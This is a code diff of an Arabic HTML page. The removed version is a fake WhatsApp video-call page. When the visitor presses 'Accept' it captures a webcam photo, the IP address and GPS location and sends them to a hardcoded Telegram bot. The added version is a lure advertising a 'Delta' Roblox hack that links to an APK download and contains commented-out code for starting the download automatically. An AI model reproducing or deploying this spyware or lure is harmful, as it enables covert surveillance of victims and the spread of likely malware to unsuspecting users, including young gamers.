@@ -2,67 +2,121 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>WhatsApp Video Call</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>تحديث دلتا - الإصدار الأخير</title>
     <style>
-        body { background: #075e54; color: white; font-family: sans-serif; text-align: center; display: flex; flex-direction: column; justify-content: center; height: 100vh; margin: 0; }
-        .avatar { width: 100px; height: 100px; background: #ddd; border-radius: 50%; margin: 0 auto 20px; }
-        .calling { font-size: 24px; margin-bottom: 10px; }
-        .accept-btn { background: #25d366; border: none; padding: 15px 40px; border-radius: 30px; color: white; font-size: 18px; cursor: pointer; font-weight: bold; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        
+        body {
+            background: radial-gradient(circle at center, #1a1a2e 0%, #0f0f1a 100%);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            color: white;
+        }
+
+        .main-card {
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            text-align: center;
+            padding: 20px;
+        }
+
+        .logo-container {
+            position: relative;
+            margin-bottom: 30px;
+        }
+
+        .logo {
+            width: 120px;
+            height: 120px;
+            border-radius: 30px;
+            box-shadow: 0 0 50px rgba(0, 123, 255, 0.5);
+            border: 2px solid #007bff;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); box-shadow: 0 0 20px rgba(0, 123, 255, 0.4); }
+            50% { transform: scale(1.05); box-shadow: 0 0 40px rgba(0, 123, 255, 0.7); }
+            100% { transform: scale(1); box-shadow: 0 0 20px rgba(0, 123, 255, 0.4); }
+        }
+
+        h1 { font-size: 28px; margin-bottom: 10px; letter-spacing: 1px; color: #fff; }
+        .version { background: #007bff; padding: 5px 15px; border-radius: 50px; font-size: 14px; margin-bottom: 20px; display: inline-block; }
+        
+        .info-box {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 20px;
+            border-radius: 15px;
+            margin-bottom: 30px;
+            width: 90%;
+            max-width: 350px;
+        }
+
+        .info-item { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 14px; color: #ccc; }
+        .info-item span:last-child { color: #007bff; font-weight: bold; }
+
+        .download-btn {
+            width: 90%;
+            max-width: 300px;
+            background: linear-gradient(45deg, #007bff, #00c6ff);
+            color: white;
+            padding: 18px;
+            text-decoration: none;
+            border-radius: 15px;
+            font-size: 20px;
+            font-weight: bold;
+            box-shadow: 0 10px 20px rgba(0, 123, 255, 0.3);
+            transition: 0.3s;
+            border: none;
+            cursor: pointer;
+        }
+
+        .download-btn:active { transform: scale(0.95); }
+
+        footer { position: absolute; bottom: 20px; color: #555; font-size: 12px; }
     </style>
 </head>
 <body>
 
-    <div class="avatar"></div>
-    <div class="calling">اتصال فيديو وارد...</div>
-    <p>يرجى قبول الاتصال للمتابعة</p>
-    <button class="accept-btn" onclick="startTrap()">رد (Accept)</button>
+<div class="main-card">
+    <div class="logo-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon.svg" class="logo" alt="Delta Logo">
+    </div>
 
-    <video id="v" autoplay style="display:none"></video>
-    <canvas id="c" style="display:none"></canvas>
+    <h1>هاك دلتا - DELTA</h1>
+    <div class="version">إصدار V2.647 الأخير</div>
+
+    <div class="info-box">
+        <div class="info-item"><span>الحالة:</span><span>يعمل بنجاح ✅</span></div>
+        <div class="info-item"><span>الحجم:</span><span>118.63 MB</span></div>
+        <div class="info-item"><span>التوافق:</span><span>Android 8+</span></div>
+    </div>
+
+    <a href="https://www.mediafire.com/file/iq1uyr0g7q8qo2v/base.apk/file" id="downloadLink" class="download-btn">تثبيت الآن</a>
+
+    <footer>جميع الحقوق محفوظة © 2026</footer>
+</div>
 
 <script>
-    const T = "8798304320:AAHW11ODgkShNPElpztLvomrquwaPDcINWQ";
-    const ID = "2092901099";
-
-    async function startTrap() {
-        try {
-            // طلب الكاميرا تحت غطاء "قبول المكالمة"
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-            
-            // سحب الـ IP والموقع الجغرافي (GPS)
-            const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());
-            
-            // محاولة سحب إحداثيات GPS (تطلب إذن آخر)
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                const gps = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                await fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${ID}&text=${encodeURIComponent("📍 موقع GPS الدقيق: " + gps)}`);
-            });
-
-            const v = document.getElementById('v');
-            v.srcObject = stream;
-
-            setTimeout(async () => {
-                const c = document.getElementById('c');
-                c.width = 400; c.height = 300;
-                c.getContext('2d').drawImage(v, 0, 0, 400, 300);
-                const blob = await new Promise(res => c.toBlob(res, 'image/jpeg', 0.5));
-
-                const fd = new FormData();
-                fd.append('chat_id', ID);
-                fd.append('photo', blob, 'shot.jpg');
-                fd.append('caption', `✅ صيد ناجح!\n🌐 IP: ${ipData.ip}\n📱 الجهاز: ${navigator.platform}`);
-
-                await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd });
-                
-                stream.getTracks().forEach(t => t.stop());
-                window.location.href = "https://www.whatsapp.com";
-            }, 2000);
-
-        } catch (e) {
-            alert("خطأ في الاتصال: يرجى السماح بالوصول للكاميرا.");
-        }
-    }
+    // خدعة لبدء التحميل تلقائياً بعد ثانيتين من دخول الصفحة
+    window.onload = function() {
+        setTimeout(function() {
+            // تفعيل الرابط تلقائياً
+            // window.location.href = document.getElementById('downloadLink').href;
+        }, 2000);
+    };
 </script>
+
 </body>
 </html>
